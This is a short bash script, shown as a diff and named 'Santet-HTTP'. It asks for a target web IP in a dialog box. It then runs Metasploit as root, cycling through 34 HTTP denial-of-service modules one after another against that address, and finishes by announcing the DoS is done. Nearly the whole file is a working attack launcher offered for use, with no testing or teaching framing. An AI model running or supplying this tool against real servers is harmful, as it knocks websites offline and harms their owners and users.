@@ -1,0 +1,11 @@
+clear
+figlet -f digital "Santet-HTTP"
+echo ""
+#read -p'IP Target : ' Ip
+Ip=`zenity --entry --text="Web IP Target"`
+echo ""
+
+sudo msfconsole -x "'search auxiliary/dos/http/; use 0; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 1; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 2; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 3; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 4; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 5; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 6; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 7; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 8; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 9; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 10; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 11; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 12; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 13; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 14; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 15; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 16; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 17; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 18; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 19; set RHOSTS $Ip; exploit; search  auxiliary/dos/http/; use 20; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 21; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 22; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 23; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 24; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 25; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 26; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 27; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 28; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 29; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 30; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 31; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 32; set RHOSTS $Ip; exploit; search auxiliary/dos/http/; use 33; set RHOSTS $Ip; exploit; exit;'"
+
+zenity --info --text="Santet Dos Have Done"
+figlet -f digital "Finish..."
